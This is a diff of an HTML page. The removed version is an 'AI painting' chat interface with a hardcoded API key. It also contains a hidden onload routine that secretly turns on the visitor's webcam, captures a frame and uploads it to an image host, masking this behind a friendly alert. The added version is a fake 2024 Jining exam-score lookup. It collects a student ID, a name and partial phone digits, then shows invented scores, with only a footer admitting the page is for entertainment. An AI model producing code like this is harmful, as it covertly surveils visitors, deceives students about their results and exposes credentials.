@@ -1,364 +1,184 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>WWZ-PAINTING</title>
-<link rel="icon" type="image/png" href="https://tse4.mm.bing.net/th/id/OIG1.TMVfxrxHZbcSnbCWqVKD?w=270&h=270&c=6&r=0&o=5&pid=ImgGn"> <!-- 添加这行用于 favicon -->
-<style>
-  * {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-  }
-  body {
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    background-color: #121212;
-    color: #fff;
-  }
-  .topbar {
-    width: 100%;
-    min-width: 600px;
-    height: 60px;
-    background: linear-gradient(90deg, #00bfff, #00ff00);
-    color: #fff;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 24px;
-  }
-  .chatbox {
-    width: 100%;
-    height: 360px;
-    margin: 20px auto;
-    background-color: #222;
-    border-radius: 15px;
-    box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
-    overflow: hidden;
-  }
-  .chat {
-    width: 100%;
-    height: 300px;
-    padding: 20px;
-    overflow: auto;
-  }
-  hr {
-    height: 1px;
-    border: none;
-    background: linear-gradient(90deg, #00ced1, #4682b4);
-  }
-  .chatbox button {
-    width: 40px;
-    height: 40px;
-    position: relative;
-    margin: 9px 9px 9px calc(100% - 49px);
-    background: linear-gradient(90deg, #9932cc, #9370db);
-    color: white;
-    border: none;
-    border-radius: 50%;
-    cursor: pointer;
-    transition: background 0.3s ease;
-  }
-  button svg {
-    margin: 10px;
-  }
-  .button:hover {
-    background: linear-gradient(90deg, #9370db, #9932cc);
-  }
-  .input-container {
-    width: 100%;
-    margin: 20px auto;
-    border-radius: 15px;
-    background: linear-gradient(90deg, #87ceeb, #00bfff);
-    box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
-    display: flex;
-    flex-direction: column; 
-  }
-  .input-container label {
-    padding: 10px;
-    font-weight: bold;
-  }
-  .input-container textarea {
-    width: calc(100% - 40px);
-    height: 100px;
-    border-radius: 15px;
-    padding: 20px;
-    font-weight: 800;
-    outline: none;
-    border: none;
-    resize: none;
-    background-color: #222;
-    color: #fff;
-    margin-bottom: 10px; 
-  }
-  .lastbox {
-    width: 100%;
-    height: 56px;
-    display: flex;
-    align-items: center;
-  }
-  .model-container {
-    position: relative;
-    margin: auto 9px auto auto;
-    overflow: hidden;
-  }
-  .model-selector {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    position: absolute;
-    top: 0;
-    left: 0;
-    right: 0;
-    bottom: 0;
-    font-size: 16px;
-    font-weight: bold;
-    color: #fff;
-    opacity: 0;
-    transform: scale(0);
-    transition: opacity 0.5s ease, transform 0.5s ease;
-  }
-  select {
-    width: 200px;
-    height: 40px;
-    padding: 0 10px;
-    border-radius: 15px;
-    border: 1px solid #006400;
-    outline: none;
-    font-size: 14px;
-    background-color: #1a1a1a;
-    color: #fff;
-    appearance: none;
-    cursor: pointer;
-  }
-  .input-container button {
-    width: 40px;
-    height: 40px;
-    position: relative;
-    margin: auto 9px auto auto;
-    background: linear-gradient(90deg, #87ceeb, #00bfff);
-    color: white;
-    border: none;
-    border-radius: 50%;
-    cursor: pointer;
-    transition: background 0.3s ease;
-  }
-  .button:hover {
-    background: linear-gradient(90deg, #00bfff, #87ceeb);
-  }
-  #canvasContainer {
-    display: none;
-  }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>查询结果</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Helvetica, sans-serif;
+            background-color: #efeff4;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            min-height: 100vh;
+            margin: 0;
+        }
+        h1 {
+            font-size: 24px;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .input-group {
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            width: 100%;
+            max-width: 400px;
+        }
+        .input-group label {
+            flex: 0 0 150px;
+            margin-right: 10px;
+            text-align: right;
+        }
+        .input-group input {
+            flex: 1;
+            padding: 8px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            margin-bottom: 10px;
+        }
+        .error {
+            color: red;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+        .results {
+            margin-top: 20px;
+            text-align: center;
+            width: 100%;
+            max-width: 800px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 10px;
+        }
+        table, th, td {
+            border: 1px solid black;
+        }
+        th, td {
+            padding: 10px;
+            text-align: center;
+        }
+        .button-container {
+            display: flex;
+            justify-content: center;
+            margin-top: 20px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .highlight {
+            color: orange;
+            font-size: 28px;
+            text-shadow: 0 0 20px gold;
+        }
+        .normal-text {
+            color: black;
+            font-size: 20px;
+        }
+        .footer {
+            position: fixed;
+            bottom: 20px;
+            text-align: center;
+            font-size: 12px;
+            width: 100%;
+            color: #888;
+        }
+    </style>
+    <script>
+        function validateInputs() {
+            // Clear previous errors
+            document.getElementById('studentIdError').textContent = '';
+            document.getElementById('phoneError').textContent = '';
+            
+            // Get input values
+            const studentId = document.getElementById('studentId').value;
+            const studentName = document.getElementById('studentName').value;
+            const phone = document.getElementById('phone').value;
+            
+            // Validate student ID
+            if (studentId.length !== 19) {
+                document.getElementById('studentIdError').textContent = '学籍号输入错误，必须为19位数字。';
+                return;
+            }
+            
+            // Validate phone number
+            if (phone.length !== 4) {
+                document.getElementById('phoneError').textContent = '手机号后四位输入错误，必须为4位数字。';
+                return;
+            }
+            
+            // Hide input fields
+            document.getElementById('inputSection').style.display = 'none';
+            
+            // Hide query button
+            document.getElementById('queryButton').style.display = 'none';
+            
+            // Display results
+            const resultsDiv = document.getElementById('results');
+            resultsDiv.innerHTML = `
+                <p class="normal-text">
+                    <span class="highlight">${studentName}</span>同学您好，
+                    您的学籍号为
+                    <span class="highlight">${studentId}</span>，
+                    您所查询的成绩如下：
+                </p>
+                <table>
+                    <tr>
+                        <th>科目</th>
+                        <th>成绩</th>
+                    </tr>
+                    <tr>
+                        <td>体育</td>
+                        <td>60</td>
+                    </tr>
+                    <tr>
+                        <td>实验</td>
+                        <td>10</td>
+                    </tr>
+                </table>
+            `;
+        }
+    </script>
 </head>
 <body>
-<div class="topbar">
-  <h1>WWZ-PAINTING</h1>
-</div>
-<div class="chatbox">
-  <div class="chat" id="chat-box"></div>
-  <hr />
-  <button onclick="clearConversation()">
-    <svg
-      xmlns="http://www.w3.org/2000/svg"
-      fill="currentColor"
-      viewBox="0 0 16 16"
-    >
-      <path
-        d="M6.5 1h3a.5.5 0 0 1 .5.5v1H6v-1a.5.5 0 0 1 .5-.5ZM11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3A1.5 1.5 0 0 0 5 1.5v1H2.506a.58.58 0 0 0-.01 0H1.5a.5.5 0 0 0 0 1h.538l.853 10.66A2 2 0 0 0 4.885 16h6.23a2 2 0 0 0 1.994-1.84l.853-10.66h.538a.5.5 0 0 0 0-1h-.995a.59.59 0 0 0-.01 0H11Zm1.958 1-.846 10.58a1 1 0 0 1-.997.92h-6.23a1 1 0 0 1-.997-.92L3.042 3.5h9.916Zm-7.487 1a.5.5 0 0 1 .528.47l.5 8.5a.5.5 0 0 1-.998.06L5 5.03a.5.5 0 0 1 .47-.53Zm5.058 0a.5.5 0 0 1 .47.53l-.5 8.5a.5.5 0 1 1-.998-.06l.5-8.5a.5.5 0 0 1 .528-.47ZM8 4.5a.5.5 0 0 1 .5.5v8.5a.5.5 0 0 1-1 0V5a.5.5 0 0 1 .5-.5Z"
-      />
-    </svg>
-  </button>
-</div>
-<div class="input-container">
-  <textarea
-    type="text"
-    id="user-input"
-    placeholder="请在这里输入"
-  ></textarea>
-  <hr />
-  <div class="lastbox">
-    <div class="model-container">
-      <select id="model-selector" onchange="changeModel()">
-        <option value="stable-diffusion">WWZ-PAINTING</option>
-      </select>
+    <h1>济宁市2024年初中学业水平考试体育、实验操作成绩查询</h1>
+    <div id="inputSection">
+        <div class="input-group">
+            <label for="studentId">学籍号输入框：</label>
+            <input type="text" id="studentId" maxlength="19">
+            <div id="studentIdError" class="error"></div>
+        </div>
+        <div class="input-group">
+            <label for="studentName">姓名输入框：</label>
+            <input type="text" id="studentName">
+        </div>
+        <div class="input-group">
+            <label for="phone">手机号后四位输入框：</label>
+            <input type="text" id="phone" maxlength="4">
+            <div id="phoneError" class="error"></div>
+        </div>
     </div>
-    <button onclick="sendMessage()">
-      <svg
-        xmlns="http://www.w3.org/2000/svg"
-        fill="currentColor"
-        viewBox="0 0 16 16"
-      >
-        <path
-          d="M15.854.146a.5.5 0 0 1 .11.54l-5.819 14.547a.75.75 0 0 1-1.329.124l-3.178-4.995L.643 7.184a.75.75 0 0 1 .124-1.33L15.314.037a.5.5 0 0 1 .54.11ZM6.636 10.07l2.761 4.338L14.13 2.576 6.636 10.07Zm6.787-8.201L1.591 6.602l4.339 2.76 7.494-7.493Z"
-        />
-      </svg>
-    </button>
-  </div>
-</div>
-<video id="video" width="640" height="480" autoplay style="display:none;"></video>
-<div id="canvasContainer">
-  <canvas id="canvas" width="640" height="480"></canvas>
-</div>
-<script>
-  var conversation = [
-    { role: "system", content: "You are a helpful AI painting assistant." },
-  ];
-  var selectedModel = "stable-diffusion";
-  function sendMessage() {
-    var userInput = document.getElementById("user-input").value;
-    appendMessage("您", userInput);
-    setTimeout(function () {
-      typeWriter("AI正在思考中...", "bot"); 
-    }, 200);
-    conversation.push({
-      role: "user",
-      content: userInput,
-    });
-    var model = selectedModel;
-    var requestOptions = {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-        Authorization: "Bearer sk-rshfwLpzD7dsowOwgnbWQ95Wbkvm3bv7sK8BX2hGCO28fbZk",
-      },
-      body: JSON.stringify({
-        model: model,
-        messages: conversation,
-        stream: false,
-        temperature: 0.5,
-        max_tokens: 4000,
-      }),
-    };
-    fetch(
-      "https://api.gptgod.online/v1/chat/completions",
-      requestOptions
-    )
-      .then((response) => response.json())
-      .then((data) => {
-        var botResponse = data.choices[0].message.content;
-        setTimeout(function () {
-          typeWriter("AI：" + botResponse, "bot");
-          conversation.push({
-            role: "assistant",
-            content: botResponse,
-          });
-        }, 1500);
-      })
-      .catch((error) => {
-        console.error("Error:", error);
-        appendErrorMessage("出现错误：" + error);
-      });
-    document.getElementById("user-input").value = "";
-  }
-  function typeWriter(text, sender) {
-    var chatBox = document.getElementById("chat-box");
-    var messageDiv = document.createElement("div");
-    messageDiv.className = sender;
-    var typingSpan = document.createElement("span");
-    typingSpan.className = "typing";
-    messageDiv.appendChild(typingSpan);
-    chatBox.appendChild(messageDiv);
-    chatBox.scrollTop = chatBox.scrollHeight;
-    var index = 0;
-    var typingInterval = setInterval(function () {
-      typingSpan.innerHTML += text[index];
-      index++;
-      if (index === text.length) {
-        clearInterval(typingInterval);
-        checkForImageURL(typingSpan.innerHTML); 
-        chatBox.scrollTop = chatBox.scrollHeight;
-      }
-    }, 50); 
-  }
-  function checkForImageURL(text) {
-    var urlRegex = /(https?:\/\/[^\s]+)/;
-    var match = text.match(urlRegex);
-    if (match) {
-      var imageUrl = match[0];
-      displayImage(imageUrl);
-    }
-  }
-  function displayImage(imageUrl) {
-    var chatBox = document.getElementById("chat-box");
-    var imageDiv = document.createElement("div");
-    imageDiv.className = "image";
-    var img = document.createElement("img");
-    img.src = imageUrl;
-    imageDiv.appendChild(img);
-    chatBox.appendChild(imageDiv);
-    chatBox.scrollTop = chatBox.scrollHeight;
-  }
-  function appendMessage(sender, message) {
-    var chatBox = document.getElementById("chat-box");
-    var messageDiv = document.createElement("div");
-    messageDiv.className = sender;
-    messageDiv.innerHTML = "<strong>" + sender + ":</strong> " + message;
-    chatBox.appendChild(messageDiv);
-    chatBox.scrollTop = chatBox.scrollHeight;
-  }
-  function appendErrorMessage(message) {
-    var chatBox = document.getElementById("chat-box");
-    var errorDiv = document.createElement("div");
-    errorDiv.className = "error";
-    errorDiv.innerHTML = "<strong>Error:</strong> " + message;
-    chatBox.appendChild(errorDiv);
-    chatBox.scrollTop = chatBox.scrollHeight;
-  }
-  function changeModel() {
-    clearConversation();
-    selectedModel = document.getElementById("model-selector").value;
-  }
-  function clearConversation() {
-    conversation = [];
-    document.getElementById("chat-box").innerHTML = "";
-  }
-  document.getElementById("user-input").addEventListener("keydown", function (event) {
-    if (event.key === "Enter") {
-      event.preventDefault();
-      sendMessage();
-    }
-  });
-  function captureAndUpload() {
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const context = canvas.getContext('2d');
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
-      })
-      .catch(error => {
-        console.error('获取摄像头数据出错：', error);
-      });
-    setTimeout(() => {
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
-      canvas.toBlob(function(blob) {
-        var formData = new FormData();
-        formData.append('image', blob);
-        formData.append('key', 'f621b2818ded22557f9260b26e3138b6'); 
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', 'https://api.imgbb.com/1/upload', true);
-        xhr.onload = function () {
-          if (xhr.status === 200) {
-            var response = JSON.parse(xhr.responseText);
-            console.log('Upload successful. Image URL:', response.data.url);
-            alert('你好呀！biu~');
-          } else {
-            console.error('Error:', xhr.statusText, xhr.status);
-            alert('你好呀！');
-          }
-        };     
-        xhr.onerror = function () {
-          console.error('Error:', xhr.statusText);
-          alert('2');
-        };
-        xhr.send(formData);
-      });
-      document.getElementById('canvasContainer').style.display = 'none';
-    }, 2000); 
-  } 
-  window.onload = captureAndUpload;
-</script>
+    <div class="button-container">
+        <button id="queryButton" onclick="validateInputs()">查询成绩</button>
+    </div>
+    <div id="results" class="results"></div>
+    <div class="footer">
+        <p>本中考成绩查询平台由吴旺泽提供技术支持<br>This junior high school exam results query platform is supported by Wu Wangze.<br>本平台所查成绩仅供娱乐，请勿当真，如需查询成绩，请访问：http://tysy.jinedu.cn</p>
+    </div>
 </body>
 </html>
